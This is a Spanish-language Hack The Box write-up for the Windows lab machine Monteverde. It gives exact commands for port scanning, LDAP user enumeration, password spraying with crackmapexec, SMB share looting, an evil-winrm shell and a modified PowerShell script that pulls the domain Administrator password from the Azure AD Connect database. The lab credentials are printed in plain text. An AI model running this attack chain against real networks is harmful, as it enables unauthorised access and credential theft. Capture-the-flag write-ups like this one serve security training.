---
title: HTB Monteverde Write-up (Español)
tags: [HackTheBox, Active Directory]
image: /assets/images/Monteverde/1__k1dpAMSzJOaosR1KtzrueA.png
published: true
banner: true
---

I cloned my writeup that was originally posted on [medium](https://medium.com/@5ubterranean/htb-monteverde-write-up-espa%C3%B1ol-298d2709ee59)

Monteverde es una máquina basada en Windows que estuvo activa desde el 11 de Enero del 2020 hasta el 13 de Junio, empezaremos enumerando usuarios con ldapsearch, probaremos un ataque por diccionario y obtendremos que un usuario usa su username también como contraseña, revisando los archivos a los que tiene acceso este usuario encontraremos credenciales de otro usuario, este nuevo usuario es parte del grupo Azure Admins, pertenecer a este grupo nos permitirá extraer la credenciales de Administrador de la base de datos presente en la máquina.

# Enumeración

Empezamos usando masscan para encontrar todos los puertos disponibles y luego usamos nmap para conseguir más información de los mismos.

```bash
masscan -e tun0 — rate=500 -p 0–65535 10.10.10.172  
nmap -sC -sV -p 49673,49675,49674,49667,9389,3268,445,53,5985,464,56439,389,3269,593,88,636,139,135, -Pn -o scan.txt 10.10.10.172

PORT      STATE SERVICE       VERSION  
53/tcp    open  domain?  
| fingerprint-strings:   
|   DNSVersionBindReqTCP:   
|     version  
|\_    bind  
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-04-25 02:23:28Z)  
135/tcp   open  msrpc         Microsoft Windows RPC  
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn  
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)  
445/tcp   open  microsoft-ds?  
464/tcp   open  kpasswd5?  
593/tcp   open  ncacn\_http    Microsoft Windows RPC over HTTP 1.0  
636/tcp   open  tcpwrapped  
3268/tcp  open  ldap  
3269/tcp  open  tcpwrapped  
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
|\_http-server-header: Microsoft-HTTPAPI/2.0  
|\_http-title: Not Found  
9389/tcp  open  mc-nmf        .NET Message Framing  
49667/tcp open  msrpc         Microsoft Windows RPC  
49673/tcp open  ncacn\_http    Microsoft Windows RPC over HTTP 1.0  
49674/tcp open  msrpc         Microsoft Windows RPC  
49675/tcp open  msrpc         Microsoft Windows RPC  
56439/tcp open  msrpc         Microsoft Windows RPC
```

Tenemos diversos puertos abiertos, pero ya que tenemos LDAP disponible empezamos por ahí, usamos `ldapsearch`, hacemos una petición por el naming context para confirmar el dominio obtenido por nmap: `ldapsearch -x -h 10.10.10.172 -s base namingcontexts`.

![](/assets/images/Monteverde/1__prwEwmnRqPhm1r4YiQoX4A.png)


Bien, confirmamos que el dominio es MEGABANK.LOCAL, ahora enumeramos todos los usuarios disponibles, esto se hace haciendo una petición especificando que solo nos devuelva las entradas donde “objectclass” sea de tipo “user”, y filtramos para crear una lista: `ldapsearch -x -h 10.10.10.172 -b "DC=MEGABANK,DC=LOCAL" 'objectClass=user' | grep sAMAccountName | awk '{print $2}'`.

![](/assets/images/Monteverde/1__LLKhMxOlLWVk2bKvJkjKJg.png)


Los tres primeros usuarios, Guest, MONTEVERDE$ y AAD\_987d7f2f57d2 son unos creados automáticamente por el servidor, ya que no hay forma de conseguir sus contraseñas por fuerza bruta o diccionario las quitamos de la lista y la guardamos como “users.txt”, ahora usamos `crackmapexec` para atacar el servidor usando “users.txt” como lista de usuarios y contraseñas: `cme smb 10.10.10.172 -u users.txt -p users.txt`.

![](/assets/images/Monteverde/1__TtX8RgnXTFTKDqL4F0fZ7w.png)


# Ganando acceso

Encontramos que “SABatchJobs” es usado como usuario y contraseña de una cuenta, volvemos a usar `crackmapexec` para comprobar a qué cosas tiene acceso esta cuenta: `cme smb 10.10.10.172 -u SABatchJobs -p SABatchJobs -- shares`.

![](/assets/images/Monteverde/1__1sKWfvhCs7j199eVFfD2HQ.png)


Tenemos acceso de lectura a unas cuantas carpetas compartidas, en [Nest](https://medium.com/@5ubterranean/htb-nest-write-up-espa%C3%B1ol-ae4cc92a7a4f) monté las carpetas compartidas y usé `tree` para revisarlas, en este casó usaremos `smbmap` para cumplir el mismo objetivo, para esto usamos: `smbmap -H 10.10.10.172 -u SABatchJobs -p SABatchJobs -R`.

![](/assets/images/Monteverde/1__MD5FhKdRSv6nHrmsuZmjXQ.png)


Solo muestro el comienzo de la salida ya que es mucho más larga, pero esto nos cumple el mismo cometido, nos lista los contenidos de todas las carpetas compartidas a las que tenemos acceso, lo más interesante que vemos es que tenemos acceso a la carpeta compartida del usuario “mhope” en “users$”.

![](/assets/images/Monteverde/1__EEeaf2eop__UuvI4hlgfd3A.png)


Nos conectamos a la carpeta compartida usando smbclient, `smbclient \\\\10.10.10.172\\users$ -U SABatchJobs`, y descargamos el archivo “azure.xml”, al leerlo nos encontramos con una contraseña.

![](/assets/images/Monteverde/1__KnWNb88I0HBk3Gov4avGiA.png)


Si bien encontramos esta contraseña dentro de la carpeta de “mhope”, usamos crackmapexec para confirmar que no sea de otro usuario, `cme smb 10.10.10.172 -u users.txt -p '4n0therD4y@n0th3r$'`.

![](/assets/images/Monteverde/1__Mhe4WXYZIn__AaokcmLdpTA.png)


Usamos `evil-winrm` para conseguir una shell en la máquina, `evil-winrm -i 10.10.10.172 -u mhope-p '4n0therD4y@n0th3r$'`.

![](/assets/images/Monteverde/1__fG5FGRBoUC8oqnda1GnHhA.png)


Y conseguimos el “user.txt”.

# Escalación de privilegios

Revisamos a qué grupos pertenece este usuario con `whoami /all`.

![](/assets/images/Monteverde/1__0ItXSn6tKnaYiP__3JUnG2Q.png)


El grupo más interesante de estos es “Azure Admins”, buscamos formas de usar este grupo para escalar privilegios y nos encontramos este [github](https://github.com/fox-it/adconnectdump) con algunos scripts para extraer credenciales de Azure AD, este nos da un link a un [blog](https://blog.xpnsec.com/azuread-connect-for-redteam/) con un script que hace lo mismo, usaremos este último y lo guardaremos como “azuread\_decrypt\_msol.ps1”, lo descargamos a la máquina objetivo usando `python3 -m http.server`, en nuestra máquina e `Invoke-WebRequest`, en la máquina Windows, y procedemos a ejecutarlo.

![](/assets/images/Monteverde/1__r4bIgPAAJI6DC__9mRhR07w.png)


El script no funciona, y nos da una larga cadena de errores, ya que es un script podemos ejecutarlo línea por línea para encontrar la que provoca el error.

![](/assets/images/Monteverde/1__QpVhjfFs7KB8DAvMPYwVpg.png)


La segunda línea es la que provoca el error, aunque esta actúa según lo especificado en la primera, y el error nos indica que no pudo encontrar el servidor, la línea original es `$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList “Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync”`, luego de hacer unas pruebas encontramos que debemos cambiar “Data Source” el cual indica el servidor y la base de datos, por “server” y “database” que indica lo mismo pero en dos valores separados, además tenemos que agregar “Intedrated Security = True”, por lo que la primera línea ahora será: `$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList “server=localhost;database=ADSync;Initial Catalog=ADSync;Integrated Security = True”`, ahora que hemos modificado el script volvemos a subirlo a la máquina y lo ejecutamos.

![](/assets/images/Monteverde/1__M57GzvJ07oOCYVIt__STdsw.png)


Obtenemos las credenciales de administrator, Username: administrator Password: d0m@in4dminyeah!, nos conectamos con `evil-winrm`.

![](/assets/images/Monteverde/1__tIqNEfI__QmTteWr3__g__9XQ.png)


Y conseguimos el “root.txt”, con esto hemos terminado con la máquina.

# Descargo de responsabilidad

Todos los recursos brindados en este post se hicieron puramente con fines educativos y de concientización, el autor no se hace responsable por las acciones que las personas puedan realizar con el contenido del mismo.